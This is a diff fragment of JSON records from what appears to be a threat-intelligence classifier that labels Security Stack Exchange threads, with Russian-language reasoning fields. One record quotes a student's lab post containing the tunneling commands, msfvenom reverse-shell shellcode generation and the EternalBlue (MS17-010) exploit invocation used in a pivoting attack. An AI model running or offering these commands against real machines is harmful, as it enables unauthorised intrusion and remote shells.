+      },
+      "status": "analyzed",
+      "normalized": {
+        "is_relevant": false,
+        "signal_kind": "other",
+        "type": "news",
+        "russian_title": null,
+        "russian_summary": null,
+        "russian_interpretation": null,
+        "category": null,
+        "severity": null,
+        "vulnerability_type": null,
+        "country": null,
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [],
+        "confidence": 0.0,
+        "reasoning_ru": "Вопрос относится к общему обсуждению практик управления зависимостями и не содержит конкретного сигнала уязвимости, эксплуатации или инцидента. Поэтому он не считается релевантным для анализа угроз."
+      }
+    },
+    {
+      "thread": {
+        "source_id": "stackexchange_security",
+        "source_label": "Information Security Stack Exchange",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "pivoting without metasploit to get reverse shell",
+        "thread_url": "https://security.stackexchange.com/questions/245042/pivoting-without-metasploit-to-get-reverse-shell",
+        "author": "Qassam Mahmoud",
+        "published_at": "2021-02-18T20:44:37+00:00",
+        "body": "I have an exam next week. I need help. This is my lab: attacker machine (kali) : 192.168.1.81 1st hacked machine (Windows 10) : 10.10.10.130 target (Windows 7) : 10.10.10.135 (have an MS17-010 exploit) Steps I follow: I hacked the Windows 10 machine I got a reverse shell via netcat on net then I upload into it (ssf) Secure Socket Funneling. I run this command on Windows 10 machine : ssf.exe -g -F 22222 -L 10.10.10.130:3333:192.168.1.81:3333 -p 11111 192.168.1.81 then I run this command in my kali machine: ./ssfd -p 11111 I add this line to etc/proxychains4.conf: socks4 127.0.0.1 22222 I got a reply from ssf client (Windows 10) to kali (ssfd server) [2021-02-18T17:03:39-05:00] [info] [config] [tls] CA cert path: [2021-02-18T17:03:39-05:00] [info] [config] [tls] cert path: [2021-02-18T17:03:39-05:00] [info] [config] [tls] key path: [2021-02-18T17:03:39-05:00] [info] [config] [tls] key password: <> [2021-02-18T17:03:39-05:00] [info] [config] [tls] dh path: [2021-02-18T17:03:39-05:00] [info] [config] [tls] cipher suite: [2021-02-18T17:03:39-05:00] [info] [config] [http proxy] [2021-02-18T17:03:39-05:00] [info] [config] [socks proxy] [2021-02-18T17:03:39-05:00] [info] [config] [circuit] [2021-02-18T17:03:39-05:00] [info] [ssfd] listening on [2021-02-18T17:03:39-05:00] [info] [ssfd] running (Ctrl + C to stop) [2021-02-18T17:09:49-05:00] [info] [microservice] [stream_listener]: forward TCP connections from to 22222 [2021-02-18T17:09:49-05:00] [info] [microservice] [stream_forwarder]: start forwarding stream fiber from fiber port 3333 to 192.168.1.81:3333 I tested nmap with a proxychains I scanned the ip: 10.10.10.135. And it works okay: [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.14 Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-18 17:31 EST [proxychains] Strict chain ... 127.0.0.1:22222 ... 10.10.10.135:80 Now I need to exploit it without metasploit. I download AutoBlue-MS17-010 from git hun and generate my shellcode: Eternal Blue Windows Shellcode Compiler Let's compile them windoos shellcodezzz Compiling x64 kernel shellcode Compiling x86 kernel shellcode kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n) y LHOST for reverse connection: 10.10.10.130 LPORT you want x64 to listen on: 3333 LPORT you want x86 to listen on: 3333 Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell 1 Type 0 to generate a staged payload or 1 to generate a stageless payload 1 Generating x64 cmd shell (stageless)... msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.10.130 LPORT=3333 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Saved as: sc_x64_msf.bin Generating x86 cmd shell (stageless)... msfvenom -p windows/shell_reverse_tcp -f raw -o sc_x86_msf.bin EXITFUNC=thread LHOST=10.10.10.130 LPORT=3333 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Saved as: sc_x86_msf.bin MERGING SHELLCODE WOOOO!!! DONE then I send it via : proxychains4 python ../eternalblue_exploit7.py 10.10.10.135 sc_x64_msf.bin And I did not get a reverse shell (Which is what I need help with)",
+        "context_messages": [],
+        "metadata": {
+          "site": "security.stackexchange",
+          "tags": [
+            "tunneling",
+            "pivoting"
+          ],
+          "score": 0,
+          "answer_count": 1,
+          "is_answered": false
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "exploit"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.167
+      },
+      "status": "analyzed",
+      "normalized": {
+        "is_relevant": false,
+        "signal_kind": "other",
+        "type": "news",
+        "russian_title": null,
+        "russian_summary": null,
+        "russian_interpretation": null,
+        "category": null,
+        "severity": null,
+        "vulnerability_type": null,
+        "country": null,
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [],
+        "confidence": 0.0,
+        "reasoning_ru": "Пост представляет собой учебный запрос о методах эксплуатации, но не содержит конкретного сигнала угрозы, уязвимости, инцидента или атаки. Это просто обсуждение техники, поэтому релевантно не считается."
+      }
+    },
+    {
+      "thread": {
+        "source_id": "stackexchange_security",
+        "source_label": "Information Security Stack Exchange",
+        "source_type": "forum",
+        "language": "en",
+        "thread_title": "Filter CVEs by affected OS",
+        "thread_url": "https://security.stackexchange.com/questions/270199/filter-cves-by-affected-os",
+        "author": "e-epsojn",
+        "published_at": "2023-05-12T06:32:11+00:00",
+        "body": "Is it possible to filter CVEs by affected platform/OS? Some sources do provide this, like exploit-db, but the main vulnerability source NVD, National Vulnerability Database, doesn't seem to have such category or filter for neither CVEs or CPEs. Is this to be expected or am I missing something? If this is not possible or reliable, how could I know if a product is affected by a vulnerability on a specific platform? Should I just assume all of them are affected?",
+        "context_messages": [],
+        "metadata": {
+          "site": "security.stackexchange",
+          "tags": [
+            "vulnerability",
+            "operating-systems",
+            "known-vulnerabilities",
+            "cve"
+          ],
+          "score": 0,
+          "answer_count": 1,
+          "is_answered": false
+        }
+      },
+      "prefilter": {
+        "passed": true,
+        "matched_keywords": [
+          "exploit",
+          "rce",
+          "vulnerability"
+        ],
+        "negative_hits": [],
+        "prefilter_score": 0.5
+      },
+      "status": "analyzed",
+      "normalized": {
+        "is_relevant": false,
+        "signal_kind": "other",
+        "type": "news",
+        "russian_title": null,
+        "russian_summary": null,
+        "russian_interpretation": null,
+        "category": null,
+        "severity": null,
+        "vulnerability_type": null,
+        "country": null,
+        "cve_mentions": [],
+        "vendor_candidates": [],
+        "product_candidates": [],
+        "evidence_tokens": [],
+        "confidence": 0.0,
+        "reasoning_ru": "Обсуждение вопросов о фильтрации CVE, не содержит конкретных угроз, уязвимостей или инцидентов. Поэтому релевантность считается низкой."
+      }
+    }
+  ]
+}
